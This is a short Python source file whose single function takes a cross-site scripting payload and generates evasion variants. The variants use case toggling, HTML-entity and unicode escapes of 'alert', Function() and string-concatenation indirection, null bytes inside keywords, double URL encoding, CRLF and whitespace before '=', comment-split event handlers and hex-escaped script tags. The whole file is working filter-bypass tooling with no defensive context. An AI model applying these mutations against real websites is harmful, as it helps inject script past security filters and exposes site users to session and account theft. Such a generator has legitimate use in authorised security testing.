from typing import List


def mutate_payload(payload: str) -> List[str]:
    m = []

    def toggle(s):
        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))
    m.append(toggle(payload))

    if "alert" in payload:
        m.append(payload.replace("alert", "&#97;&#108;&#101;&#114;&#116;"))
        m.append(payload.replace("alert", "\\u0061lert"))
        m.append(payload.replace("alert(1)", "top['al'+'ert'](1)"))
        m.append(payload.replace("alert(1)", "Function('alert(1)')()"))

    for kw in ["script", "svg", "img", "onerror", "onload"]:
        if kw in payload.lower():
            i = payload.lower().index(kw)
            m.append(payload[:i + len(kw)//2] + "\x00" + payload[i + len(kw)//2:])

    m.append(payload.replace("<", "%253C").replace(">", "%253E"))

    for ws in ["\t", "\n", "%0a", "%0d"]:
        if "=" in payload:
            m.append(payload.replace("=", ws + "=", 1))

    for kw in ["onload", "onerror", "onfocus"]:
        if kw in payload.lower():
            m.append(payload.lower().replace(kw, kw[:2] + "<!---->" + kw[2:], 1))

    if "<script>" in payload:
        m.append(payload.replace("<script>", "\\x3cscript\\x3e")
                        .replace("</script>", "\\x3c/script\\x3e"))

    return list(dict.fromkeys(x for x in m if x and x != payload))
